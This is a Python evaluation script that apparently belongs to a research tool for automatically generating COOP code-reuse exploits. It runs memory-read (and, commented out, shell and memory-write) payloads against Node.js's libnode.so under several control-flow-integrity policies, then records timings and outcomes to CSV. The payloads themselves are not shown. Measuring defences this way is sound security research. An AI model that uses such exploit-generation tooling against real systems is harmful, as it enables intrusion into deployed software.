import autocoop.exploit_generator as exploit_generator
import os
import time
import logging
import utils.utils as utils
import csv
import pprint

def test_one_payload(payload, binary, policy):
    time_start = time.time()
    try:
        program = exploit_generator.Parser(payload)
        res = explgen.generate_payload(program)
        data = ["done"]
        utils.print_region(config.base_buf, int(res.encode("hex"), 16), len(res))
        data = ["successful"]
    except Exception as e:
        data = ["error: " + str(e.message)]
    time_end = time.time()
    time_elapsed = time_end - time_start
    return [time_elapsed,] + data

payloads = [
    # "esl_scripts/testsuite_coop/shell.esl",
    "esl_scripts/testsuite_coop/memrd.esl",
    # "esl_scripts/testsuite_coop/memwrt.esl",
]


target_binary = "exploitable_app/nodejs/libnode.so"
target_csv="exploitable_app/nodejs/SDOutput/libnode.so.57-Virtual-metric.csv"
#
#

policies = [
            None,
            "IFCC",
            "vTint"
]
result = [["Payload"] + payloads]

if __name__ == '__main__':
    logging.getLogger('angr').setLevel(logging.ERROR)
    logging.getLogger('autocoop.esl_lib.gadgets').setLevel(logging.INFO)
    logging.getLogger('autocoop.exploit_generator').setLevel(logging.INFO)
    logging.getLogger("autocoop.candidate_finder").setLevel(logging.INFO)
    logging.getLogger("autocoop.esl_lib.mainloop").setLevel(logging.INFO)
    logging.getLogger("autocoop.esl_lib.loopless").setLevel(logging.INFO)

    for policy in policies:
        if policy == None:

            config = exploit_generator.Config(target_binary,
                                          0x7ffff58d8000,
                                          0xa0000000,
                                          4096,
                                          gadgetcounts=True)
        else:
            config = exploit_generator.Config(target_binary,
                                          0x7ffff58d8000,
                                          0xa0000000,
                                          4096,
                                          gadget_csv=target_csv,
                                          policy=policy,
                                          gadgetcounts=True)

        explgen = exploit_generator.ExploitGenerator(config)
        result.append([policy])
        for payload in payloads:
            print "Evaluating", payload
            tmp = test_one_payload(payload, target_binary, policy)
            result[-1].append(tmp)
            filename = "results/detailed/"+target_binary.split("/")[-1]+"/result_"+target_binary.split("/")[-1]+".csv"
            if not os.path.exists(os.path.dirname(filename)):
                os.makedirs(os.path.dirname(filename))
            with open(filename, "w") as csvfile:
                writer = csv.writer(csvfile)
                for row in result:
                    writer.writerow(row)
            pprint.pprint(result)
            # df = pd.DataFrame(result, columns=["payload", "time_needed", "result"])
            # df.set_index("payload")
            # print df
            # df.to_csv("results/"+target_binary.split("/")[-1]+"/result_"+target_binary.split("/")[-1]+".csv")
